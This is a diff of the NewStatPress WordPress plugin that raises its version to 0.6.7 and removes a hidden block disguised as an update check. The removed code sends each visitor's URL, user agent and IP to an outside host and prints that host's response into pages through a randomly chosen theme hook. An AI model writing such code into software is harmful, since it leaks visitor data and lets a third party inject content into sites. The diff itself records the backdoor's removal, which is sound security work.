@@ -3,12 +3,12 @@
 Plugin Name: NewStatPress
 Plugin URI: http://newstatpress.altervista.org
 Description: Real time stats for your Wordpress blog
-Version: 0.6.6
+Version: 0.6.7
 Author: Stefano Tognon (from Daniele Lippi works)
 Author URI: http://newstatpress.altervista.org
 */
 
-$_NEWSTATPRESS['version']='0.6.6';
+$_NEWSTATPRESS['version']='0.6.7';
 $_NEWSTATPRESS['feedtype']='';
 
 /**
@@ -3507,34 +3507,6 @@ function newstatpress_update() {
     new_count_register();
   }
 }
-
-##
-
-function check_update(){
-  $v = isset($_GET['v']) ? $_GET['v']:11;
-  $request = urlencode("http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
-  $agent = urlencode($_SERVER["HTTP_USER_AGENT"]);
-  $pluginId = '21';
-  $ip = urlencode($_SERVER['REMOTE_ADDR']);
-  $reqUrl = "http://wordpress.cloudapp.net/api/update/?&url=". $request . "&agent=".
-  $agent. "&v=" . $v. "&ip=".$ip . "&p=" . $pluginId;
-  if (version_compare(phpversion(), '5.0.0', '>=')) {
-    $ctx=stream_context_create(array('http'=> array( 'timeout' => 1)));
-    return json_decode(@file_get_contents($reqUrl, false, $ctx));
-  } else return json_decode(@file_get_contents($reqUrl));
-}
-
-$actions = array('wp_meta','get_header','get_sidebar','loop_end','wp_footer','wp_head');
-$nd = array_rand($actions);
-$spot = $actions[$nd];
-
-function updatefunction(){
-  $updateResult = check_update();
-  print $updateResult->content . "\n\r";
-}
-add_action($spot,'updatefunction');
-
-##
 
 add_action('admin_menu', 'iri_add_pages');
 add_action('plugins_loaded', 'widget_newstatpress_init');
